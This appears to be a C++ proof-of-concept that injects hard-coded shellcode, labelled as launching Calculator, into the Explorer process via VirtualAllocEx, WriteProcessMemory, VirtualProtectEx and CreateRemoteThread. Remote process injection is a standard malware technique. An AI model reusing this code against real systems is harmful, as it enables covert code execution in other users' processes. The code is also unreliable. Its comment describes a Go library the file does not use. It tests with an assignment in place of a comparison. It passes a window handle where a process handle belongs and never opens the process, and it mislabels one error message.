/*
This program executes shellcode in a remote process using the following steps
	1. Get a handle to the target process with FindWindowA
	1. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
	2. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
	3. Change the memory page permissions to Execute/Read with VirtualProtectEx
	4. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread
	5. Close the handle to the remote process

This program leverages the functions from golang.org/x/sys/windows WHERE POSSIBLE to call Windows procedures instead of manually loading them
*/

#include <cstdio>
#include <Windows.h>

int main() {
    // Pop Calc Shellcode (x86 & x64)
    unsigned char shellcode[] = { 80,81,82,83,86,87,85,106,96,90,104,99,97,108,99,84,89,72,131,236,40,101,72,139,50,72,139,118,24,72,139,118,16,72,173,72,139,48,72,139,126,48,3,87,60,139,92,23,40,139,116,31,32,72,1,254,139,84,31,36,15,183,44,23,141,82,2,173,129,60,7,87,105,110,69,117,239,139,116,31,28,72,1,254,139,52,174,72,1,247,153,255,215,72,131,196,48,93,95,94,91,90,89,88,195 };

	DWORD pid;
	DWORD old;

	// Inject Explorer.exe
	HWND hwnd =  FindWindowA("CabinetWClass", NULL);
	if (hwnd = NULL) {
		puts("FindWindowA failed");
		return -1;
	}
	GetWindowThreadProcessId(hwnd, &pid);
	if (pid == NULL) {
		puts("GetWindowThreadProcessId failed");
		return -1;
	}

	LPVOID dest = VirtualAllocEx(hwnd, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (dest == NULL) {
		puts("VirtualAllocEx failed");
		return -1;
	}

	BOOL res = WriteProcessMemory(hwnd, dest, shellcode, sizeof(shellcode), NULL);
	if (res == 0) {
		puts("VirtualAllocEx failed");
		return -1;
	}

	res = VirtualProtectEx(hwnd, dest, sizeof(shellcode), PAGE_EXECUTE_READ, &old);
	if (res == 0) {
		puts("VirtualProtectEx failed");
		return -1;
	}
	HANDLE thread = CreateRemoteThread(hwnd, NULL, 0, (LPTHREAD_START_ROUTINE)dest, NULL, 0, NULL);
	if (thread == NULL) {
		puts("CreateRemoteThread failed");
		return -1;
	}

	CloseHandle(hwnd);

    return 0;
}